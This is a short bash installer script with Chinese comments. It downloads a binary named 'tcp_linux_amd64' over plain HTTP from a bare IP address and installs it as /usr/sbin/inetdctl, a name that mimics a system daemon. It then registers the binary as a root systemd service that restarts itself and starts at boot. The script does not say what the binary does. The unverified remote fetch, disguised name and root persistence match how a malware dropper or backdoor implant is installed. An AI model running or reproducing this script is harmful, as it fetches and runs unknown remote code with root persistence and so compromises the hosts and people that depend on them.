#!/bin/bash

# 遇到错误直接退出
set -e

# -------------------------------------
# 配置信息
# -------------------------------------

SERVICE_NAME="inetdctl"                           # 服务名
DOWNLOAD_URL="http://207.246.104.121/tcp_linux_amd64"            # 下载链接
INSTALL_DIR="/usr/sbin"                           # 安装位置
EXEC_FILE="$INSTALL_DIR/inetdctl"                 # 最终可执行文件

# -------------------------------------
# 1. 下载文件
# -------------------------------------

echo "[+] 下载文件到 $INSTALL_DIR ..."
curl -L "$DOWNLOAD_URL" -o "$EXEC_FILE"

# -------------------------------------
# 2. 授权执行
# -------------------------------------

echo "[+] 添加执行权限..."
chmod +x "$EXEC_FILE"

# -------------------------------------
# 3. 创建 systemd 服务
# -------------------------------------

echo "[+] 创建 systemd 服务文件..."

SERVICE_FILE="/etc/systemd/system/$SERVICE_NAME.service"

cat <<EOF > $SERVICE_FILE
[Unit]
Description=$SERVICE_NAME service
After=network.target

[Service]
Type=simple
ExecStart=$EXEC_FILE
Restart=always
RestartSec=3
User=root
WorkingDirectory=$INSTALL_DIR

[Install]
WantedBy=multi-user.target
EOF

# -------------------------------------
# 4. 重载 systemd
# -------------------------------------

echo "[+] 重新加载 systemd..."
systemctl daemon-reload

# -------------------------------------
# 5. 开机自启
# -------------------------------------

echo "[+] 设置开机自启..."
systemctl enable "$SERVICE_NAME"

# -------------------------------------
# 6. 启动服务
# -------------------------------------

echo "[+] 启动服务..."
systemctl start "$SERVICE_NAME"

# -------------------------------------
# 7. 显示状态
# -------------------------------------

echo "[+] 服务已启动："
systemctl status "$SERVICE_NAME" --no-pager